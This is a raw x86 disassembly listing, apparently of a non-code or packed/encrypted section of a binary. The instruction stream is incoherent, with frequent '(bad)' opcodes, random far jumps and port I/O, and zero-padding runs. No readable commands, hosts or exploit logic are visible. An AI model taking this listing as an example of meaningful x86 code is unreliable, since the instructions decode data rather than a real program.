  421efc:	adc    dl,ch
  421efe:	dec    ebx
  421eff:	mov    ebp,0x1d99ec5b
  421f04:	clc    
  421f05:	or     DWORD PTR [ebp-0x35],edx
  421f08:	xor    dh,BYTE PTR [edi+edi*1-0x3619fa7e]
  421f0f:	(bad)  
  421f10:	ficom  DWORD PTR [ebx-0x7ee5e1ca]
  421f16:	shl    DWORD PTR [edi],cl
  421f18:	vfnmadd132ss xmm4,xmm7,DWORD PTR [edx+0x66d4bbe6]
  421f21:	fcmovbe st,st(7)
  421f23:	leave  
  421f24:	xor    ah,BYTE PTR [esi]
  421f26:	and    dh,0x59
  421f29:	jae    0x421f68
  421f2b:	sbb    BYTE PTR [edi+esi*1],dl
  421f2e:	ficom  DWORD PTR [esi-0x4f]
  421f31:	add    DWORD PTR [edx-0x159b32bb],esp
  421f37:	stos   BYTE PTR es:[edi],al
  421f38:	and    DWORD PTR [ebx+esi*1],edx
  421f3b:	nop
  421f3c:	outs   dx,BYTE PTR ds:[esi]
  421f3d:	and    eax,0xfbab5582
  421f42:	mov    esp,0xa426a2
  421f48:	add    BYTE PTR [eax],al
  421f4a:	add    BYTE PTR [eax],al
  421f4c:	add    BYTE PTR [eax],al
  421f4e:	fidiv  DWORD PTR [edx]
  421f50:	xchg   edi,eax
  421f51:	mov    bh,bh
  421f53:	scas   eax,DWORD PTR es:[edi]
  421f54:	fbstp  TBYTE PTR [edx+0x3]
  421f57:	inc    ebp
  421f58:	mov    ds:0x6b7b1a5c,eax
  421f5d:	or     DWORD PTR [ebx+0x610001d7],ebx
  421f63:	add    BYTE PTR [eax],al
  421f65:	add    BYTE PTR [ecx],dh
  421f67:	bnd ret 
  421f69:	and    al,0x38
  421f6b:	in     eax,dx
  421f6c:	fstp   DWORD PTR [ecx]
  421f6e:	adc    al,0xab
  421f70:	pop    ebx
  421f71:	or     BYTE PTR [esi],0x5f
  421f74:	pop    eax
  421f75:	or     eax,esi
  421f77:	aas    
  421f78:	(bad)  
  421f79:	dec    esi
  421f7a:	xor    DWORD PTR [ebx],esi
  421f7c:	shl    cx,1
  421f7f:	adc    ebx,ecx
  421f81:	push   edi
  421f82:	cs retf 0x1689
  421f86:	push   ecx
  421f87:	push   ecx
  421f88:	pop    ds
  421f89:	adc    BYTE PTR [edi-0x18316038],al
  421f8f:	int    0xd1
  421f91:	adc    ebx,esi
  421f93:	jp     0x421f32
  421f95:	loop   0x421fa2
  421f97:	mov    dl,ah
  421f99:	clc    
  421f9a:	and    eax,0x381fe269
  421f9f:	mov    ebp,0x7e4a1be0
  421fa4:	push   edx
  421fa5:	xchg   ecx,eax
  421fa6:	mov    eax,0xe5163310
  421fab:	mov    al,0xdc
  421fad:	xlat   BYTE PTR ds:[ebx]
  421fae:	scas   eax,DWORD PTR es:[edi]
  421faf:	les    ecx,FWORD PTR [ebx-0x7aa5b5d8]
  421fb5:	outs   dx,DWORD PTR ds:[esi]
  421fb6:	push   cs
  421fb7:	pop    edx
  421fb8:	xchg   edi,eax
  421fb9:	dec    edx
  421fba:	push   edx
  421fbb:	sar    bh,1
  421fbd:	popa   
  421fbe:	lods   al,BYTE PTR ds:[esi]
  421fbf:	fmul   DWORD PTR [eax-0x73dc2c64]
  421fc5:	push   0x6c
  421fc7:	add    BYTE PTR [eax],al
  421fc9:	add    BYTE PTR [eax],al
  421fcb:	add    BYTE PTR [eax],al
  421fcd:	add    BYTE PTR [eax-0x1c],cl
  421fd0:	add    ebx,DWORD PTR [ebx-0x8270051]
  421fd6:	pop    esi
  421fd7:	sub    BYTE PTR [eax+0x5ebf858f],bl
  421fdd:	cmp    edi,esp
  421fdf:	xlat   BYTE PTR ds:[ebx]
  421fe0:	add    DWORD PTR [eax],eax
  421fe2:	popa   
  421fe3:	add    BYTE PTR [eax],al
  421fe5:	add    BYTE PTR ds:0x8c3479e9,dl
  421feb:	xchg   ecx,eax
  421fec:	pop    esp
  421fed:	inc    edi
  421fee:	push   ds
  421fef:	push   ebp
  421ff0:	cli    
  421ff1:	retf   0x63b4
  421ff4:	data16 shl BYTE PTR [edx-0x74],cl
  421ff8:	or     eax,0xcd60f69c
  421ffd:	mov    eax,ds:0x6e5bebf3
  422002:	xchg   DWORD PTR ds:0xef32124c,eax
  422008:	cmp    bl,bl
  42200a:	gs test eax,0xd359e2b2
  422010:	dec    eax
  422011:	cmp    eax,0x54cdb146
  422016:	leave  
  422017:	pop    esp
  422018:	fwait
  422019:	pop    ebx
  42201a:	pop    ebx
  42201b:	jp     0x421fbc
  42201d:	test   edx,esi
  42201f:	mov    edi,DWORD PTR [esi-0x60]
  422022:	sbb    al,0x1c
  422024:	jg     0x42204c
  422026:	xchg   esp,eax
  422027:	scas   eax,DWORD PTR es:[edi]
  422028:	lock xchg edx,eax
  42202a:	sbb    al,ch
  42202c:	inc    ebp
  42202d:	das    
  42202e:	xchg   ebp,eax
  42202f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422030:	cld    
  422031:	push   esp
  422032:	jl     0x42209f
  422034:	loopne 0x422060
  422036:	stos   BYTE PTR es:[edi],al
  422037:	sub    DWORD PTR ds:0x9d73e1c5,edi
  42203d:	sbb    eax,0xdd1ec00d
  422042:	imul   edi,DWORD PTR [ebp+0x16be07],0x0
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR [eax],al
  42204d:	add    BYTE PTR [edx+0x4],dl
  422050:	mov    ds:0x72a6f682,al
  422055:	aam    0x6d
  422057:	xor    dh,BYTE PTR [edx]
  422059:	and    eax,0x56638eec
  42205e:	pop    ebp
  42205f:	fadd   DWORD PTR [ecx]
  422061:	add    BYTE PTR [ecx+0x0],ah
  422064:	add    BYTE PTR [eax],al
  422066:	inc    ecx
  422067:	fsubr  DWORD PTR [ecx-0x23b6ae92]
  42206d:	mov    esp,edi
  42206f:	and    BYTE PTR [edx+edi*4],0x6c
  422073:	or     esp,ebp
  422075:	push   eax
  422076:	push   esi
  422077:	xchg   ecx,eax
  422078:	scas   eax,DWORD PTR es:[edi]
  422079:	lock in eax,dx
  42207b:	outs   dx,BYTE PTR ds:[esi]
  42207c:	xor    eax,0xea9e7c74
  422081:	out    0x4d,eax
  422083:	daa    
  422084:	sti    
  422085:	into   
  422086:	js     0x42209b
  422088:	(bad)  
  42208a:	stos   BYTE PTR es:[edi],al
  42208b:	out    dx,al
  42208c:	and    cl,cl
  42208e:	hlt    
  42208f:	in     eax,0x2a
  422091:	pusha  
  422092:	nop
  422093:	sbb    eax,0x12888cbd
  422098:	clc    
  422099:	scas   al,BYTE PTR es:[edi]
  42209a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209b:	add    DWORD PTR [ebx+0x5b],esi
  42209e:	adc    BYTE PTR [esi],ah
  4220a0:	in     eax,0xee
  4220a2:	test   al,0xe
  4220a4:	xchg   esp,eax
  4220a5:	out    0x60,eax
  4220a7:	pop    esp
  4220a8:	stos   BYTE PTR es:[edi],al
  4220a9:	mov    eax,DWORD PTR [ebx+edi*1-0xe]
  4220ad:	addr16 mov bh,0xc9
  4220b0:	inc    ebp
  4220b1:	sub    al,0x33
  4220b3:	out    0x17,al
  4220b5:	scas   al,BYTE PTR es:[edi]
  4220b6:	into   
  4220b7:	inc    edi
  4220b8:	dec    esi
  4220b9:	jmp    0x2c8f:0x4e3edf21
  4220c0:	outs   dx,BYTE PTR ds:[esi]
  4220c1:	push   edi
  4220c2:	cmp    DWORD PTR [eax],esp
  4220c4:	stos   DWORD PTR es:[edi],eax
  4220c5:	mov    edx,0x5
  4220ca:	add    BYTE PTR [eax],al
  4220cc:	add    BYTE PTR [eax],al
  4220ce:	cmp    BYTE PTR [edx-0x6a],ch
  4220d1:	add    edx,esi
  4220d3:	(bad)  
  4220d4:	mov    ebp,0xdb4ef67b
  4220d9:	out    0xd4,eax
  4220db:	cmp    edi,ebx
  4220dd:	adc    DWORD PTR [esi+0x610001d8],edi
  4220e3:	add    BYTE PTR [eax],al
  4220e5:	add    BYTE PTR [edx+0x2f],al
  4220e8:	aad    0x5
  4220ea:	les    ebx,FWORD PTR cs:[bp+di+0x18f6]
  4220f0:	sbb    BYTE PTR [ebx-0x9],bl
  4220f3:	jb     0x42210a
  4220f5:	jnp    0x42216f
  4220f7:	jae    0x422166
  4220f9:	mov    bh,0x40
  4220fb:	cmp    esi,esp
  4220fd:	and    eax,0x88ef0e36
  422102:	dec    ebp
  422103:	ds leave 
  422105:	outs   dx,DWORD PTR ds:[esi]
  422106:	inc    ebp
  422108:	push   0x6d
  42210a:	cmp    ah,BYTE PTR [edx+ebx*4-0x35]
  42210e:	pop    esp
  42210f:	jmp    0xcd70:0x339498dd
  422116:	pop    esp
  422117:	push   esi
  422118:	push   ecx
  422119:	(bad)  
  42211a:	popf   
  42211b:	(bad)  
  42211c:	cld    
  42211d:	aad    0x7f
  42211f:	mov    dl,dl
  422121:	jle    0x422173
  422123:	cmp    al,0xdb
  422125:	jmp    0x422101
  422127:	push   ecx
  422128:	mov    bh,0x1b
  42212a:	addr16 call 0xfdef034
  422130:	imul   edx,edx,0x41
  422133:	push   esi
  422134:	in     eax,dx
  422135:	fwait
  422136:	cmp    eax,0xa90f01ff
  42213b:	sub    ch,BYTE PTR [edi+0x11]
  42213e:	ficom  WORD PTR [ecx]
  422140:	mov    ds:0xb544a674,eax
  422145:	xor    dl,cl
  422147:	add    BYTE PTR [eax],al
  422149:	add    BYTE PTR [eax],al
  42214b:	add    BYTE PTR [eax],al
  42214d:	add    cl,ch
  42214f:	mov    ecx,0xf37a307a
  422154:	jmp    0x42214f
  422156:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42215a:	fsubr  st,st(3)
  42215c:	mov    BYTE PTR [edi],al
  42215e:	pop    ds
  42215f:	fld    DWORD PTR [ecx]
  422161:	add    BYTE PTR [ecx+0x0],ah
  422164:	add    BYTE PTR [eax],al
  422166:	aad    0x43
  422168:	les    esp,FWORD PTR [esi]
  42216a:	mov    esi,0x45e0de17
  42216f:	add    cl,dl
  422171:	cmp    al,0xd1
  422173:	jno    0x422161
  422175:	mov    eax,ds:0xbeb56099
  42217a:	mov    cl,0xaa
  42217c:	mov    WORD PTR [edi-0x3e5448e5],ss
  422182:	jb     0x42214d
  422184:	inc    ecx
  422185:	cmp    DWORD PTR [ebp+0x67],ebp
  422188:	push   edi
  422189:	cdq    
  42218a:	mov    eax,ds:0xbcf90a8c
  42218f:	out    0x84,eax
  422191:	pop    eax
  422192:	mov    bx,0xcef4
  422196:	and    al,0x9d
  422198:	and    eax,eax
  42219a:	gs je  0x422165
  42219d:	(bad)  
  42219e:	push   ss
  42219f:	ds inc esp
  4221a1:	add    edi,esi
  4221a3:	int3   
  4221a4:	je     0x42221a
  4221a6:	repnz ficomp DWORD PTR [eax-0x1cf5333b]
  4221ad:	adc    al,0x88
  4221af:	sub    eax,0xbce7fa55
  4221b4:	fild   QWORD PTR [eax+0x42]
  4221b7:	pusha  
  4221b8:	cld    
  4221b9:	mov    ah,0x64
  4221bb:	xor    al,0x48
  4221bd:	xchg   ecx,eax
  4221be:	clc    
  4221bf:	or     BYTE PTR [ebp+0x76c3d0c],bh
  4221c5:	xor    DWORD PTR [edi],ecx
  4221c7:	add    BYTE PTR [eax],al
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [eax],al
  4221cd:	add    BYTE PTR [ebx+0x41],bl
  4221d0:	pop    ebx
  4221d1:	iret   
  4221d2:	pop    ebx
  4221d3:	(bad)  
  4221d5:	aad    0xf
  4221d7:	ss dec esp
  4221d9:	dec    esi
  4221da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221db:	into   
  4221dc:	pop    ss
  4221dd:	mov    al,ds:0x1d980
  4221e2:	popa   
  4221e3:	add    BYTE PTR [eax],al
  4221e5:	add    BYTE PTR [eax],cl
  4221e7:	inc    ecx
  4221e8:	jecxz  0x422174
  4221ea:	cmp    eax,0xa84d1242
  4221ef:	or     al,0x2c
  4221f1:	sbb    al,0xa2
  4221f3:	sar    DWORD PTR [esp+ecx*4],cl
  4221f6:	jge    0x4221fc
  4221f8:	je     0x42220d
  4221fa:	int3   
  4221fb:	dec    ebx
  4221fc:	add    eax,0xf8626457
  422201:	push   ss
  422202:	das    
  422203:	mov    ebx,0xd2337f64
  422208:	push   0xffffff97
  42220a:	mov    ebx,0x62b7796
  42220f:	fld    QWORD PTR [esi+esi*8-0x44]
  422213:	arpl   WORD PTR [edx+0x2435d69e],di
  422219:	adc    al,0x60
  42221b:	sbb    cl,bh
  42221d:	rcr    BYTE PTR [ebx],cl
  42221f:	test   al,0x10
  422221:	retf   
  422222:	mov    edi,0x5c1c363e
  422227:	das    
  422228:	push   esp
  422229:	or     eax,0x8702fcb7
  42222e:	lahf   
  42222f:	out    0xd2,al
  422231:	mov    WORD PTR [ecx+0x4a84e0bc],gs
  422237:	scas   al,BYTE PTR es:[edi]
  422238:	out    0xa9,al
  42223a:	loopne 0x42225a
  42223c:	mov    dh,0x9a
  42223e:	stc    
  42223f:	in     eax,0xd9
  422241:	enter  0xd2e2,0x0
  422245:	icebp  
  422246:	std    
  422247:	add    BYTE PTR [eax],al
  422249:	add    BYTE PTR [eax],al
  42224b:	add    BYTE PTR [eax],al
  42224d:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422253:	cld    
  422254:	(bad)  [edi-0x65be08a1]
  42225a:	int3   
  42225b:	pop    eax
  42225c:	bound  eax,QWORD PTR [ecx+eiz*8-0x27]
  422260:	add    DWORD PTR [eax],eax
  422262:	popa   
  422263:	add    BYTE PTR [eax],al
  422265:	add    BYTE PTR ds:0xe62babbf,bl
  42226b:	fwait
  42226c:	dec    DWORD PTR [ebp-0x41]
  42226f:	inc    esp
  422270:	mov    al,0x97
  422272:	retf   
  422273:	fbstp  TBYTE PTR [eax+ebx*2-0x18]
  422277:	lock gs push ebp
  42227a:	ja     0x422270
  42227c:	retf   0x65af
  42227f:	loope  0x4222dc
  422281:	pop    ecx
  422282:	idiv   DWORD PTR [ecx-0x72f8abcc]
  422288:	rcr    DWORD PTR [eax],0xb2
  42228b:	fmul   DWORD PTR ds:0x748f9b21
  422291:	and    BYTE PTR [esi],bl
  422293:	fcomp  QWORD PTR [esp+eax*2+0x1f]
  422297:	loopne 0x422233
  422299:	daa    
  42229a:	js     0x42229f
  42229c:	push   ebx
  42229d:	cmc    
  42229e:	sti    
  42229f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a0:	sub    al,0x70
  4222a2:	inc    esp
  4222a3:	cmp    bh,dl
  4222a5:	test   dh,al
  4222a7:	ss (bad) 
  4222a9:	aam    0x1d
  4222ab:	aas    
  4222ac:	xor    edi,DWORD PTR [ecx+0x328f976a]
  4222b2:	(bad)  
  4222b3:	xchg   esp,eax
  4222b4:	add    esi,esi
  4222b6:	mov    ecx,0x749f9d2b
  4222bb:	mov    bl,0x94
  4222bd:	in     eax,0xab
  4222bf:	ja     0x4222dd
  4222c1:	mov    edi,0x298dc58
  4222c6:	inc    eax
  4222c7:	add    BYTE PTR [eax],al
  4222c9:	add    BYTE PTR [eax],al
  4222cb:	add    BYTE PTR [eax],al
  4222cd:	add    BYTE PTR [esi+0x73],ch
  4222d0:	lock retf 0xcbfd
  4222d4:	jle    0x4222cd
  4222d6:	repz xor eax,0x25418ce9
  4222dc:	add    DWORD PTR [edi+0x1da42],edi
  4222e2:	popa   
  4222e3:	add    BYTE PTR [eax],al
  4222e5:	add    BYTE PTR [ebx-0x531140fe],cl
  4222eb:	fsin   
  4222ed:	(bad)  
  4222ee:	mov    esp,0xbf59bfd9
  4222f3:	enter  0xeb5f,0xd9
  4222f7:	lods   al,BYTE PTR ds:[esi]
  4222f8:	or     BYTE PTR [ecx-0x27],dl
  4222fb:	xchg   BYTE PTR [esi-0x164eda6d],dh
  422301:	xor    dh,BYTE PTR [edx+0x6db9c0c5]
  422307:	mov    WORD PTR [edi-0x1ea044ee],ds
  42230d:	pop    ebx
  42230e:	lea    edi,[edx+0x51bcb28a]
  422314:	(bad)  
  422315:	mov    ecx,0x395ed751
  42231a:	mov    esi,0x23aa2661
  42231f:	sahf   
  422320:	shl    DWORD PTR [edi-0x5637c457],1
  422326:	push   es
  422327:	int3   
  422328:	or     al,0x3d
  42232a:	loop   0x4222ad
  42232c:	pop    ebp
  42232d:	xchg   esp,eax
  42232e:	dec    ebp
  42232f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422330:	in     al,dx
  422331:	sbb    bh,cl
  422333:	sub    eax,edx
  422335:	pop    ebp
  422336:	cwde   
  422337:	pop    ds
  422338:	mov    al,ds:0x138aba15
  42233d:	adc    BYTE PTR [edi+0x49],cl
  422340:	xor    esp,DWORD PTR [esi+0x12]
  422343:	mov    bh,0x37
  422345:	add    edx,DWORD PTR [eax+0x0]
  422348:	add    BYTE PTR [eax],al
  42234a:	add    BYTE PTR [eax],al
  42234c:	add    BYTE PTR [eax],al
  42234e:	cmc    
  42234f:	adc    al,0xae
  422351:	adc    ebp,edi
  422353:	mov    ebx,0x84e6f6fd
  422358:	lds    ebp,FWORD PTR [edx+0x24b842a9]
  42235e:	mov    ds:0x610001da,eax
  422363:	add    BYTE PTR [eax],al
  422365:	add    BYTE PTR [esi+0x77],dh
  422368:	into   
  422369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42236a:	imul   ebp,DWORD PTR [edx],0xfffffff4
  42236d:	ins    BYTE PTR es:[edi],dx
  42236e:	sar    BYTE PTR [ebx-0x4922261b],0x4c
  422375:	sub    edi,ebx
  422377:	add    BYTE PTR [edi],0x47
  42237a:	pusha  
  42237b:	mov    al,0x10
  42237d:	inc    ebx
  42237e:	das    
  42237f:	fidivr WORD PTR [edx-0x2e]
  422382:	out    0xda,eax
  422384:	dec    ecx
  422385:	add    DWORD PTR [ecx],0x52
  422388:	rol    al,cl
  42238a:	je     0x4223ca
  42238c:	shl    BYTE PTR [eax+ebx*4],0x6f
  422390:	mov    ch,0xca
  422392:	pop    ecx
  422393:	mov    DWORD PTR [ebp+0x55],ebp
  422396:	cli    
  422397:	dec    esp
  422398:	imul   esp,edx,0x2fa03dd9
  42239e:	shr    BYTE PTR [eax-0x77],0xd4
  4223a2:	adc    bh,BYTE PTR ds:0x75c84d69
  4223a8:	inc    ebx
  4223a9:	std    
  4223aa:	inc    esp
  4223ab:	mov    ebp,0xad5d12f6
  4223b0:	add    DWORD PTR [ecx+0xe],ebp
  4223b3:	(bad)  
  4223b4:	jmp    0xc940e14c
  4223b9:	add    al,BYTE PTR [esi]
  4223bb:	cmp    ch,bl
  4223bd:	jl     0x422405
  4223bf:	mov    bl,0xe7
  4223c1:	sbb    bl,ah
  4223c3:	sti    
  4223c4:	leave  
  4223c5:	adc    al,0xd3
  4223c7:	add    BYTE PTR [eax],al
  4223c9:	add    BYTE PTR [eax],al
  4223cb:	add    BYTE PTR [eax],al
  4223cd:	add    BYTE PTR [ebx],bh
  4223cf:	mov    cl,0x57
  4223d1:	lock fcomip st,st(6)
  4223d4:	mov    edi,0xbb1c16fb
  4223d9:	rcr    al,0x58
  4223dc:	jmp    0x21d28b0
  4223e1:	add    BYTE PTR [ecx+0x0],ah
  4223e4:	add    BYTE PTR [eax],al
  4223e6:	out    dx,eax
  4223e7:	cmc    
  4223e8:	adc    eax,0xdd6dc4df
  4223ed:	imul   esi,DWORD PTR [ebx-0x32ef0568],0x1e
  4223f4:	aas    
  4223f5:	dec    ebx
  4223f6:	cs push cs
  4223f8:	jp     0x42238d
  4223fa:	sbb    ch,0xcf
  4223fd:	rcl    DWORD PTR [ebx],1
  4223ff:	or     edi,DWORD PTR ds:[ebx-0x34]
  422403:	or     BYTE PTR [eax-0x1b],cl
  422406:	pop    ss
  422407:	(bad)  
  422409:	stc    
  42240a:	mov    bl,0x3d
  42240c:	cmp    eax,0xed298fa9
  422411:	out    dx,al
  422412:	sahf   
  422413:	xchg   ebx,eax
  422414:	out    dx,eax
  422415:	pop    ebx
  422416:	cmp    BYTE PTR [esi+0x3a],bh
  422419:	xor    al,0x25
  42241b:	add    BYTE PTR [ebp+0x6c7daea7],ah
  422421:	sub    edi,DWORD PTR [ebp-0x1a03a62]
  422427:	mov    ecx,0xf86535a6
  42242c:	aaa    
  42242d:	(bad)  
  42242e:	jmp    DWORD PTR [eax+0x21]
  422431:	mov    ebp,0x6519ff34
  422436:	pop    esi
  422437:	mov    dh,0xa0
  422439:	shl    DWORD PTR [edi+esi*8],0x5f
  42243d:	fstp   DWORD PTR [ecx]
  42243f:	push   ss
  422440:	pop    ecx
  422441:	jmp    0x42243b
  422443:	mov    ds:0x76b55e,al
  422448:	add    BYTE PTR [eax],al
  42244a:	add    BYTE PTR [eax],al
  42244c:	add    BYTE PTR [eax],al
  42244e:	aam    0xf
  422450:	push   ecx
  422451:	lock (bad) 
  422454:	cmc    
  422455:	das    
  422456:	sbb    BYTE PTR [eax],cl
  422458:	xchg   ebx,eax
  422459:	iret   
  42245a:	dec    edi
  42245b:	out    dx,al
  42245c:	mov    ch,0x9a
  42245e:	fild   DWORD PTR gs:[ecx]
  422461:	add    BYTE PTR [ecx+0x0],ah
  422464:	add    BYTE PTR [eax],al
  422466:	(bad)  
  422467:	mov    dh,0xac
  422469:	test   ebp,eax
  42246b:	push   ss
  42246c:	dec    ebp
  42246d:	fdiv   DWORD PTR [edx-0x29]
  422470:	sub    edi,DWORD PTR [eax+0x4379f853]
  422476:	cld    
  422477:	repz aas 
  422479:	mov    esp,0x3ecfbc60
  42247e:	mov    cs,WORD PTR [edi]
  422480:	out    0x39,eax
  422482:	outs   dx,BYTE PTR ds:[esi]
  422483:	jmp    0x2c9:0xb4e3049e
  42248a:	paddw  mm0,QWORD PTR [ecx-0x21]
  42248e:	pusha  
  42248f:	aaa    
  422490:	pop    eax
  422491:	sub    DWORD PTR [eax+0x1f],esp
  422494:	ja     0x4224cd
  422496:	jb     0x4224ac
  422498:	dec    eax
  422499:	xchg   ebx,eax
  42249a:	ficom  DWORD PTR [ebx-0x69150bd6]
  4224a0:	sbb    al,0x73
  4224a2:	inc    esp
  4224a3:	imul   edi,ebp,0xd1a4d9c5
  4224a9:	out    0x66,al
  4224ab:	sbb    BYTE PTR [ebp-0x6],0x93
  4224af:	mov    eax,ds:0xecd8450c
  4224b4:	(bad)  
  4224b5:	pop    ecx
  4224b6:	adc    BYTE PTR [edi-0x7079e375],ch
  4224bc:	xchg   ebp,eax
  4224bd:	adc    eax,0xc2a30710
  4224c2:	das    
  4224c3:	jge    0x422534
  4224c5:	out    0x90,eax
  4224c7:	add    BYTE PTR [eax],al
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [eax],al
  4224cd:	add    ch,cl
  4224cf:	sub    eax,0xfbf54395
  4224d4:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4224da:	or     BYTE PTR [ebx+edi*2],ah
  4224dd:	sbb    esi,eax
  4224df:	fild   DWORD PTR [ecx]
  4224e1:	add    BYTE PTR [ecx+0x0],ah
  4224e4:	add    BYTE PTR [eax],al
  4224e6:	add    al,0x69
  4224e8:	fidiv  DWORD PTR [eax+0xb5bdb8]
  4224ee:	adc    al,0x42
  4224f0:	fld    TBYTE PTR [ebx-0x6dd0ebdb]
  4224f6:	scas   al,BYTE PTR es:[edi]
  4224f7:	xor    esi,DWORD PTR [ecx-0x4a]
  4224fa:	cmc    
  4224fb:	inc    ecx
  4224fc:	call   0xba1f0333
  422501:	retf   0x438
  422504:	or     eax,0xa91ef2aa
  422509:	lds    edx,FWORD PTR [ebx+0x3f]
  42250c:	bt     esi,ecx
  42250f:	sbb    al,0xaf
  422511:	xchg   esi,eax
  422512:	(bad)  
  422513:	cli    
  422514:	sub    cl,BYTE PTR [ebp+0x76d07d00]
  42251a:	and    eax,0x477e50b9
  42251f:	pop    edi
  422520:	sti    
  422521:	out    0xba,eax
  422523:	mov    BYTE PTR [edx+0x2c480699],dh
  422529:	ret    
  42252a:	add    BYTE PTR [edx-0x4c],ah
  42252d:	push   ebp
  42252e:	into   
  42252f:	int3   
  422530:	xchg   cl,cl
  422532:	loop   0x422539
  422534:	cld    
  422535:	mov    al,ds:0x385ba145
  42253a:	(bad)  
  42253b:	push   edx
  42253c:	push   esi
  42253d:	les    esp,FWORD PTR [esi]
  42253f:	pop    ecx
  422540:	addr16 dec ebx
  422542:	rcl    DWORD PTR [ebp-0x23],1
  422545:	in     al,dx
  422546:	xchg   edx,eax
  422547:	add    BYTE PTR [eax],al
  422549:	add    BYTE PTR [eax],al
  42254b:	add    BYTE PTR [eax],al
  42254d:	add    BYTE PTR [ebx],dl
  42254f:	fs out 0xb,eax
  422552:	test   DWORD PTR [ebx-0xce58301],0xd814cfc
  42255c:	or     ebx,DWORD PTR [ecx]
  42255e:	daa    
  42255f:	fadd   QWORD PTR [ecx]
  422561:	add    BYTE PTR [ecx+0x0],ah
  422564:	add    BYTE PTR [eax],al
  422566:	shl    bl,cl
  422568:	add    al,0x53
  42256a:	div    BYTE PTR [edx]
  42256c:	mov    edi,0xbfab01e9
  422571:	mov    ebx,0x275cf492
  422576:	cmp    BYTE PTR [edi+0x5d007c14],ch
  42257c:	repz pushf 
  42257e:	ins    DWORD PTR es:[edi],dx
  42257f:	sub    ecx,DWORD PTR [edi]
  422581:	pop    ds
  422582:	mov    ch,0xb8
  422584:	mov    ebp,0x3a73abe1
  422589:	jns    0x42253f
  42258b:	jg     0x42258d
  42258d:	ins    BYTE PTR es:[edi],dx
  42258e:	(bad)  [esi-0x50]
  422591:	or     ch,bl
  422593:	call   0xa5f8acdf
  422598:	or     DWORD PTR [ebx-0x6f],ebp
  42259b:	aas    
  42259c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259d:	rol    BYTE PTR [edx+esi*1+0xae10c02],cl
  4225a4:	les    ecx,FWORD PTR [ecx+0x2b77fbc5]
  4225aa:	fst    DWORD PTR [edx+0x12de7065]
  4225b0:	cwde   
  4225b1:	mov    ah,0xdd
  4225b3:	stos   BYTE PTR es:[edi],al
  4225b4:	out    dx,al
  4225b5:	pop    es
  4225b6:	ins    DWORD PTR es:[edi],dx
  4225b7:	add    BYTE PTR [edx+0x133f23ad],ah
  4225bd:	fmul   QWORD PTR ds:0x2f75eab2
  4225c3:	add    al,0x7f
  4225c5:	jns    0x4225c3
  4225c7:	add    BYTE PTR [eax],al
  4225c9:	add    BYTE PTR [eax],al
  4225cb:	add    BYTE PTR [eax],al
  4225cd:	add    BYTE PTR [esi],dh
  4225cf:	add    dl,BYTE PTR [ebp+0xc]
  4225d2:	jne    0x422633
  4225d4:	jg     0x422610
  4225d6:	clc    
  4225d7:	cs aas 
  4225d9:	push   0xc6ab9389
  4225de:	in     al,0xce
  4225e0:	add    DWORD PTR [eax],eax
  4225e2:	popa   
  4225e3:	add    BYTE PTR [eax],al
  4225e5:	add    BYTE PTR [ecx+0x37],al
  4225e8:	lods   al,BYTE PTR ds:[esi]
  4225e9:	loopne 0x422653
  4225eb:	test   eax,0x86294a1d
  4225f0:	jns    0x4225e9
  4225f2:	and    al,0xf6
  4225f4:	(bad)  [ecx]
  4225f6:	mov    ebp,0xae06384b
  4225fb:	mov    edi,fs
  4225fd:	into   
  4225fe:	fxam   
  422600:	js     0x4225ac
  422602:	aaa    
  422603:	inc    esp
  422604:	inc    edx
  422605:	mov    eax,DWORD PTR [esi+esi*2+0x2a]
  422609:	mov    edx,0xa217e859
  42260e:	xor    BYTE PTR [ebx-0x56],ah
  422611:	xor    ch,BYTE PTR [edx]
  422613:	lahf   
  422614:	int    0xdd
  422616:	popa   
  422617:	loopne 0x42267b
  422619:	add    al,0xa7
  42261b:	jmp    0x4019:0x19fe3dd7
  422622:	lahf   
  422623:	aas    
  422624:	sbb    BYTE PTR [esi-0x35c8f0ad],0xfe
  42262b:	xor    esp,esi
  42262d:	xchg   edi,eax
  42262e:	faddp  st(0),st
  422630:	shl    esp,cl
  422632:	dec    esp
  422633:	adc    BYTE PTR [ecx-0x1e],al
  422636:	sub    eax,DWORD PTR [eax+0x2fc20cc3]
  42263c:	(bad)  
  42263d:	cli    
  42263e:	popa   
  42263f:	rcr    DWORD PTR [edi],0x80
  422642:	jle    0x422622
  422644:	jp     0x4225f6
  422646:	jg     0x422648
  422648:	add    BYTE PTR [eax],al
  42264a:	add    BYTE PTR [eax],al
  42264c:	add    BYTE PTR [eax],al
  42264e:	or     BYTE PTR [ecx-0x404c48e],dh
  422654:	dec    ecx
  422655:	mov    bl,0x94
  422657:	je     0x422630
  422659:	call   0xcf45:0x66f9fd31
  422660:	add    DWORD PTR [eax],eax
  422662:	popa   
  422663:	add    BYTE PTR [eax],al
  422665:	add    BYTE PTR [eax],dl
  422667:	dec    eax
  422668:	cmovne edx,ebp
  42266b:	out    dx,eax
  42266c:	push   0x4174293
  422671:	jns    0x42260c
  422673:	std    
  422674:	add    dl,BYTE PTR [eax+0x28406cc9]
  42267a:	inc    ecx
  42267b:	cmp    DWORD PTR [ebx+esi*1-0x69],ebp
  42267f:	ret    
  422680:	mov    esi,0xa2301f85
  422685:	push   0x868ef821
  42268a:	frstor [edi-0x519eebad]
  422690:	ins    DWORD PTR es:[edi],dx
  422691:	mov    cs,WORD PTR [esi-0x7f]
  422694:	pop    eax
  422695:	xchg   DWORD PTR [edi-0x74282bf9],esi
  42269b:	xchg   esi,eax
  42269c:	cmp    al,0x89
  42269e:	aas    
  42269f:	test   eax,0xb3c61f0f
  4226a4:	in     al,0x5
  4226a6:	aam    0x87
  4226a8:	mov    ch,0x7c
  4226aa:	mov    ch,0xeb
  4226ac:	outs   dx,DWORD PTR ds:[esi]
  4226ad:	mov    WORD PTR [edi+0x6993f9eb],gs
